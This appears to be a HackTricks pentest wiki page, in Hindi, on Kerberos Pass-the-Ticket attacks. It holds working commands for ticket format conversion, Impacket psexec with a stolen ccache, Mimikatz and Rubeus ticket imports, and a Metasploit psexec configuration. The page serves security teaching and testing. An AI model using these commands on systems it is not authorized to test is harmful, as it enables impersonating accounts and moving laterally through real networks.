# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## अवलोकन

Pass-the-Ticket (PtT) हमले में, एक adversary चोरी किए गए Kerberos ticket का उपयोग करके उस ticket के principal के रूप में authenticate करता है, बिना उस account का password जाने। Ticket-granting ticket (TGT) का उपयोग service tickets का अनुरोध करने के लिए किया जा सकता है, जबकि चोरी किया गया service ticket केवल अपनी target service और validity period तक सीमित होता है।<sup>[[1]](#references)</sup>

Ticket हासिल करने की techniques के लिए, देखें:

- [Windows से tickets हासिल करना](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Linux से tickets हासिल करना](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

## Linux और Windows Ticket Formats को कन्वर्ट करना

Kerberos caches आमतौर पर Linux पर MIT `ccache` files और Windows पर `.kirbi` files के रूप में मिलते हैं। `ticket_converter` input ticket और output path का उपयोग करके इन formats के बीच conversion करता है।<sup>[[2]](#references)</sup>

```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
# Expected message: Converting ccache => kirbi
python ticket_converter.py velociraptor.kirbi velociraptor.ccache
# Expected message: Converting kirbi => ccache
```

Kekeo Windows पर Kerberos ticket tooling भी प्रदान करता है।<sup>[[3]](#references)</sup>

## Ticket का उपयोग करना

Linux पर, `KRB5CCNAME` को cache पर point करें और Impacket client को password मांगे बिना Kerberos का उपयोग करने का निर्देश दें:<sup>[[4]](#references)</sup>

```bash
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```

Windows पर, Mimikatz या Rubeus किसी `.kirbi` ticket को मौजूदा लॉगऑन सत्र में import कर सकते हैं। परिणामी cache की जाँच के लिए `klist` का उपयोग करें।<sup>[[5]](#references)[[6]](#references)</sup>

```powershell
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:'[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi'
klist
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```

Ticket import करने से ticket में दर्शाए गए और target service की authorization policy द्वारा अनुमत privileges से अधिक privileges नहीं मिलते। Expired, revoked, malformed या गलत scope वाले tickets विफल हो सकते हैं।<sup>[[1]](#references)</sup>

Kerberos attacks के व्यापक संदर्भ और ticket हासिल करने की संबंधित तकनीकों के लिए, Tarlogic की Kerberos attack guide देखें।<sup>[[7]](#references)</sup>

### Metasploit में external ticket का दोबारा उपयोग

Metasploit अपने Kerberos modules के लिए Impacket के `KRB5CCNAME` को अपने-आप नहीं पढ़ता। Module को उसके protocol-specific `::Krb5Ccname` option के ज़रिए **ccache file** दें। `::Rhostname` को target के SPN hostname पर और domain को target domain पर सेट करें; `RHOST` अब भी target IP हो सकता है। इससे account password डाले बिना पहले से हासिल किए गए ticket का उपयोग किया जा सकता है।<sup>[[8]](#references)</sup>

ज़रूरत पड़ने पर पहले `.kirbi` को ccache में convert करें।<sup>[[9]](#references)</sup>

उदाहरण के लिए, target पर services बनाने की अनुमति वाले account के ticket के साथ, उस cache का उपयोग करके [SMB PsExec module](../lateral-movement/psexec-and-winexec.md) चलाएँ:<sup>[[8]](#references)[[9]](#references)[[10]](#references)</sup>

```text
use exploit/windows/smb/psexec
set RHOST 192.0.2.20
set SMBUser Administrator
set SMBDomain corp.example
set SMB::Auth kerberos
set SMB::Rhostname server.corp.example
set SMB::Krb5Ccname /path/to/administrator.ccache
set DomainControllerRhost 192.0.2.10
run
```

Metasploit सबसे पहले दिए गए cache से मेल खाने वाला service ticket चुनता है। अगर उसे केवल TGT मिलता है, तो वह KDC से service ticket का अनुरोध करता है, इसलिए इस रास्ते के लिए भी DC से कनेक्टिविटी ज़रूरी है। केवल service ticket वाला cache असंबंधित hosts तक पहुँच नहीं देता। अन्य समर्थित modules के लिए, option prefix बदलें (उदाहरण के लिए, [WinRM](../lateral-movement/winrm.md) के लिए `Winrm::Krb5Ccname`)।<sup>[[8]](#references)</sup>



## References

- [1] [MITRE ATT&CK T1550.003 - Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/)
- [2] [Zer1t0 - `ticket_converter`](https://github.com/Zer1t0/ticket_converter)
- [3] [gentilkiwi - Kekeo](https://github.com/gentilkiwi/kekeo)
- [4] [Fortra - Impacket उदाहरण](https://github.com/fortra/impacket/tree/master/examples)
- [5] [gentilkiwi - Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [6] [GhostPack - Rubeus](https://github.com/GhostPack/Rubeus)
- [7] [Tarlogic - Kerberos हमले की तकनीकें](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [8] [Metasploit - सेवा प्रमाणीकरण](https://docs.metasploit.com/docs/pentesting/active-directory/kerberos/service_authentication.html)
- [9] [Metasploit - kirbi और ccache फ़ाइलों को कन्वर्ट करना](https://docs.metasploit.com/docs/pentesting/active-directory/kerberos/ticket_converter.html)
- [10] [Metasploit SMB client Kerberos कार्यान्वयन](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/remote/smb/client.rb)
{{#include ../../banners/hacktricks-training.md}}
